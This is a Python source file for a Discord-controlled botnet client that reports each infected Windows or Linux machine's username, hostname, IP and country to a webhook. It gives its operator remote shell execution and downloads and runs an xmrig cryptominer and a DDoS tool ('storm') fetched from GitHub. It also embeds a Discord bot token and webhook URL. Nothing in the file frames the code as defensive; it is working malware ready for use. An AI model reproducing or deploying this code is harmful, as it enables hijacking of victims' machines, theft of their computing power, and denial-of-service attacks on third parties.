from discord_webhook import DiscordWebhook
from discord.ext import commands
import requests, discord, socket, psutil, sys, os

token = 'MTA0OTAwNzUyNzMwOTg3NzM2OA.GW2DVM.5xMnOFVcSDLCHre1levj9KitiwGmAXHMgC3BHU' # Token
webhook_url = "https://discord.com/api/webhooks/1048891575016632320/Gl8adKreETPIKuzGvOfh0TqlX9bEMoN5IuHKQ2NoIV19ozn12sYw87yJZnEgZA5J8wwJ" # Webhook URL

# Client
if sys.platform == "linux":
    import pwd
    avatar = "https://github.com/rxu7s/XC/blob/main/linux.jpeg?raw=true"
    username = pwd.getpwuid(os.getuid())[0]
    sysplatform = "Linux"
    temp = "/tmp"
else:
    avatar = "https://github.com/rxu7s/XC/blob/main/windows.jpeg?raw=true"
    username = os.getlogin()
    sysplatform = "Windows"
    temp = os.getenv("temp")

os.chdir(temp)
hostname = socket.gethostname()
ip = requests.get("http://ip-api.com/line/?fields=query").text
iso = requests.get("http://ip-api.com/line/?fields=countryCode").text
bot_name = f"[{iso}] {ip} | {username}@{hostname}"

# Bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='>', intents=intents, help_command=None)


# ----- Commands ----- #

# status
@bot.command()
async def stats(ctx):
    if sys.platform == 'Linux':
        if "xmrig" in (i.name() for i in psutil.process_iter()):
            miner_stat = "+"
        else:
            miner_stat = "-"

        if "storm" in (i.name() for i in psutil.process_iter()):
            ddos_stat = "+"
        else:
            ddos_stat = "-"
    else:
        ddos_stat = "-"

        if "xmrig.exe" in (i.name() for i in psutil.process_iter()):
            miner_stat = "+"
        else:
            miner_stat = "-"

    webhook = DiscordWebhook(webhook_url, content=f'``miner: [{miner_stat}] ddos: [{ddos_stat}]``', username=bot_name, avatar_url=avatar)
    response = webhook.execute()

# shell
@bot.command()
async def shell(ctx, *cmds):
    cmd = ' '.join(cmds)
    os.popen(cmd)
    webhook = DiscordWebhook(webhook_url, content='``command executed``', username=bot_name, avatar_url=avatar)
    response = webhook.execute()

# miner
@bot.command()
async def miner(ctx, walletArg):
    wallet = ''.join(walletArg)
    if sys.platform == "linux":
        if not os.path.exists('xmrig'):
            url = "https://github.com/rxu7s/XC/raw/main/xmrig"
            r = requests.get(url)
            open("xmrig", 'wb').write(r.content)

        os.popen(f"chmod 777 xmrig; ./xmrig --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Linux -k --tls")
    else:
        if not os.path.exists('xmrig.exe'):
            url = "https://github.com/rxu7s/XC/raw/main/xmrig.exe"
            r = requests.get(url)
            open("xmrig.exe", 'wb').write(r.content)

        os.popen(f"xmrig.exe --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Windows -k --tls")

    webhook = DiscordWebhook(webhook_url, content='``miner started``', username=bot_name, avatar_url=avatar)
    response = webhook.execute()

# ddos
@bot.command()
async def ddos(ctx, ddosArg):
    ddosip = ''.join(ddosArg)
    if sys.platform == "linux":
        url = "https://github.com/rxu7s/XC/raw/main/storm"
        r = requests.get(url)
        open("storm", 'wb').write(r.content)

        os.popen(f"chmod 777 storm; ./storm -d {ddosip}")
        webhook = DiscordWebhook(webhook_url, content=f'``ddos started: {ddosip}``', username=bot_name, avatar_url=avatar)
        response = webhook.execute()

# stop miner
@bot.command()
async def stopminer(ctx):
    if sys.platform == "linux":
        if "xmrig" in (i.name() for i in psutil.process_iter()):
            os.popen("pkill xmrig")

            webhook = DiscordWebhook(webhook_url, content='``miner stoped``', username=bot_name, avatar_url=avatar)
            response = webhook.execute()
    else:
        if "xmrig.exe" in (i.name() for i in psutil.process_iter()):
            os.popen("taskkill /F /IM xmrig.exe /T")

            webhook = DiscordWebhook(webhook_url, content='``miner stoped``', username=bot_name, avatar_url=avatar)
            response = webhook.execute()

# stop ddos
@bot.command()
async def stopddos(ctx):
    if sys.platform == "linux":
        if "storm" in (i.name() for i in psutil.process_iter()):
            os.popen("pkill storm")
            webhook = DiscordWebhook(webhook_url, content='``ddos stoped``', username=bot_name, avatar_url=avatar)
            response = webhook.execute()

bot.run(token)